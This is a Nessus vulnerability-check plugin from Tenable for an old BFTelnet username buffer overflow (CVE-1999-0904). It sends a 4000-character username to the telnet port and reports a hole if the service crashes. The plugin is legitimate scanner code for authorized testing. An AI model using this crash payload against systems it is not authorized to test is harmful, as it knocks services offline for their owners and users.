#
# (C) Tenable Network Security, Inc.
#

#
# See also:
# Subject: IBM Infoprint Remote Management Simple DoS 
# Date: Fri, 25 Oct 2002 12:19:23 +0300
# From: "Toni Lassila" <toni.lassila@mc-europe.com>
# To: bugtraq@securityfocus.com
#


include("compat.inc");


if(description)
{
 script_id(10026);
 script_version ("1.33");

 script_cve_id("CVE-1999-0904");
 script_bugtraq_id(771);
 script_xref(name:"EDB-ID", value:"19596");

 script_name(english:"BFTelnet Username Handling Remote Overflow DoS");
 script_summary(english:"crashes the remote telnet server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote telnet server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(attribute:"description", value:
"It was possibly to crash the remote telnet server by sending a very
long user name.  A remote attacker could exploit this to crash the
server, or possibly execute arbitrary code." );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this telnet server."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/11/03");
 script_cvs_date("Date: 2018/06/27 18:42:27");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Windows");

 script_copyright(english:"This script is Copyright (C) 1999-2018 Tenable Network Security, Inc.");

 script_require_ports("Services/telnet", 23);
 script_dependencies("telnetserver_detect_type_nd_version.nasl", "os_fingerprint.nasl");

 exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');
include('telnet_func.inc');
include('misc_func.inc');
include('audit.inc');

if(report_paranoia < 2 && "Windows" >!< get_kb_item_or_exit("Host/OS"))
  audit(AUDIT_OS_NOT, "Windows");

port = get_service(svc: "telnet", default: 23, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

   banner = telnet_negotiate(socket:soc);
   data = string(crap(4000), "\r\n");
   send(socket:soc, data:data);
   close(soc);

if (service_is_dead(port: port, exit: 1) > 0)   
  security_hole(port);

